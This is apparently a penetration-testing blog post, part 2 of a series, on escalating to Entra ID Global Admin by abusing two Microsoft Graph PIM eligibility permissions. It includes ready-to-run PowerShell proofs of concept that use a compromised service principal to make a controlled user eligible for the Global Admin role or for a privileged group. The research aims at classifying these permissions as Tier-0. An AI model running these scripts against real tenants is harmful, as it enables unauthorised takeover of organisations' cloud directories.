---
title: "Abusing PIM-related application permissions in Microsoft Graph - Part 2"
catchphrase: "Escalating to Global Admin via eligible assignments."
image: "/assets/images/blog/2024-07-25-abusing-pim-related-application-permissions-part-1/00_Abusing_PIM_related_application_permissions_In_Microsoft_Graph.png"
last_modified_at: 2024-07-31
tags:
  - Microsoft Graph
  - Entra ID
  - Azure
  - Pentesting
  - Red-teaming
---

## Introduction

In the [first part](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1) of this series, we discussed how permissions related to active assignments can be abused to escalate to Global Admin.
In this part, we will take a closer look at permissions related to eligible assignments, to see how they can be abused to achieve the same thing.

### Overview of the series

This series, which discusses the abuse of PIM-related application permissions in Microsoft Graph, is structured as follows:
- [**Part 1**: Escalating to Global Admin via active assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1)
- [**Part 2**: Escalating to Global Admin via eligible assignments](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-2)
- [**Part 3**: Bypassing assignment, eligibility and activation requirements](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3)
- [**Part 4**: Investigating legacy permissions](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-4)

### What permissions are addressed in this post?

This post discusses the following MS Graph application permissions:
- [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory)
- [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup)

 
## Privilege escalation via PIM role eligibility and activation

### Overview of abuse information

| Abused application permission | Path type | Known shortest path | Example |
|---|---|---|---|
| [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory) | Indirect | Can become eligible and activate the Global Admin role. | TA makes a controlled user account eligible to the Global Admin role, and activates it to escalate to Global Admin. <br> Note: if the eligibility assignment or role activation requires to meet specific requirements such as admin approval, this path needs to be combined with the [`RoleManagementPolicy.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#rolemanagementpolicyreadwritedirectory) permission to be successful (see [Part 3](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3) of the series for more info). |

### Attack path visualization

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/01_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/01_screenshot.png)

### Proof of Concept

We will assume that we are in a scenario where we have compromised a service principal with the [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory) permission, and where we control an unprivileged user account with no Entra role assignment:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/02_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/02_screenshot.png)

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/03_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/03_screenshot.png)

The PowerShell code to leverage the compromised “Harmless app” and make our “Harmless user account” eligible to the Global Admin role is as follows:

```
## Set SP info
$tid = ''
$appid = ''
$password = ''

# Set user info
$userId = ''

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request PIM role eligibility
$roleDefinitionId = '62e90394-69f5-4237-9190-012177145e10' # current: Global Admin (replace with any role Id)
$yesterday = (get-date).AddDays(-1).ToString("yyyy-MM-ddTHH:mm:ss.000Z")

$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$eligibleAssignment = @{
    action = 'adminAssign'
    justification = 'PoC'
    roleDefinitionId = $roleDefinitionId
    directoryScopeId = '/'
    principalId = $userId
    scheduleInfo = @{
        startDateTime = $yesterday
        expiration = @{
            type = 'NoExpiration'
        }
    }
}

$body = ConvertTo-Json -InputObject $eligibleAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```

By executing the above PowerShell script, we can confirm that the [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory) permission can be leveraged to make a controlled user account eligible to the Global Admin role:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/04_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/04_screenshot.png)

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/05_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/06_screenshot.png)

The next step is to log in with the user account and activate the role to become an active Global Admin ([what if the activation requires admin approval?](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3)):

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/07_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/07_screenshot.png)


## Privilege escalation via PIM group eligibility and activation

### Overview of abuse information

| Abused application permission | Path type | Known shortest path | Example |
|---|---|---|---|
| [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup) | Direct | Can become eligible to a group with an active Global Admin assignment, and activate the group membership to escalate to Global Admin. | TA makes a controlled user account eligible to a group that is actively assigned the Global Admin role, activates the group membership and escalates to Global Admin. <br>Note: if the eligibility assignment or membership activation requires to meet specific requirements such as admin approval, this path needs to be combined with the [`RoleManagementPolicy.ReadWrite.AzureADGroup`](#rolemanagementpolicy-readwrite-azureadgroup) permission to be successful (see [Part 3](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3) of the series for more info). |

### Attack path visualization

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/08_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/08_screenshot.png)

### Proof of Concept
We will assume that we are in a scenario where we have compromised a service principal with the [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup) permission, and where we control an unprivileged user account with no group assignment:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/09_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/09_screenshot.png)

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/10_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/10_screenshot.png)

We will also assume that we have identified a user group called “Global Admins” that is permanently assigned the Global Admin role. Only emergency break-glass accounts are active members of the group, while nobody is eligible:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/11_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/11_screenshot.png)

The PowerShell code to leverage the compromised “Harmless app” and make our “Harmless user account” eligible as a member of the “Global Admins” group is as follows:

```
## Set SP info
$tid = ''
$appid = ''
$password = ''

# Set user info
$userId = ''

# Set group info
$groupId = ''
$groupRole = 'member'   # 'member' or 'owner'

# Acquire MS Graph access token
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appId, $securePassword
Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential
$token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# Request PIM group eligibility
$threeHoursAgo = (get-date).AddHours(-3).ToString("yyyy-MM-ddTHH:mm:ss.000Z")
$uri = 'https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilityScheduleRequests'
$headers = @{
    'Authorization'= "Bearer $token"
    'Content-Type' = 'application/json'
}

$eligibleAssignment = @{
    action = 'adminAssign'
    justification = 'PoC'
    accessId = $groupRole
    principalId = $userId
    groupId = $groupId
    scheduleInfo = @{
        startDateTime = $threeHoursAgo
        expiration = @{
            type = 'afterDuration'
            duration = 'PT5H'
        }
    }
}

$body = ConvertTo-Json -InputObject $eligibleAssignment
$response = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $body
$response
```
By executing the above PowerShell script, we can confirm that the [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup) permission can be leveraged to make a controlled user account eligible to the “Global Admins” group:

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/12_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/12_screenshot.png)

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/13_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/13_screenshot.png)

The next step is to log in with the user account and activate the membership, to become an active member of the “Global Admins” group and endorse the Global Admin role ([what if the activation requires admin approval?](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3)):

[![](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/14_screenshot.png)](/assets/images/blog/2024-07-31-abusing-pim-related-application-permissions-part-2/14_screenshot.png)


## Conclusion

We have seen that both the [`RoleEligibilitySchedule.ReadWrite.Directory`](https://learn.microsoft.com/en-us/graph/permissions-reference#roleeligibilityschedulereadwritedirectory) and [`PrivilegedEligibilitySchedule.ReadWrite.AzureADGroup`](https://learn.microsoft.com/en-us/graph/permissions-reference#privilegedeligibilityschedulereadwriteazureadgroup) permission represent a risk for escalating to Global Admin. Similar to those discussed in [Part 1](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1/) of the series, these application permissions should therefore be classified as Tier-0, due to their risk of having a path to Global Admin.

Finally, some readers may wonder about situations where eligible PIM assignments and activations require meeting additional requirements, such as MFA or the approval from an administrator. Stay assured, discussing how to disable those constraints is already available in [part 3](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-3/) of this series 😊
